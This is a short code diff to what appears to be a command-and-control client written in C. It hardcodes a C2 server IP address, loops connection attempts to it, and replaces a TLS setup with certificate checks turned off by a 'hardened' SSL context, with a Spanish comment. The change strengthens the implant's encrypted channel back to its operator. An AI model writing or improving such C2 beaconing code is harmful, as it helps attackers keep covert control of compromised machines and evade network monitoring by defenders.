@@ -19,6 +19,7 @@
 #include <openssl/err.h>
 #include <json-c/json.h>
 #include "config.h"
+#include "ssl_hardening.h"
 
 #ifndef C2_HOST
 #define C2_HOST "93.95.231.134"
@@ -298,14 +299,13 @@ int connect_to_c2() {
     while (attempts < MAX_RECONNECT_ATTEMPTS) {
         printf("[*] Connecting to C2 %s:%d (attempt %d)...\n", C2_HOST, C2_PORT, attempts + 1);
         
-        SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
+        // Usar SSL hardeneado
+        SSL_CTX *ctx = create_hardened_ssl_ctx(0);
         if (!ctx) {
             attempts++;
             sleep(RECONNECT_DELAY);
             continue;
         }
-        
-        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
         
         int sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock < 0) {
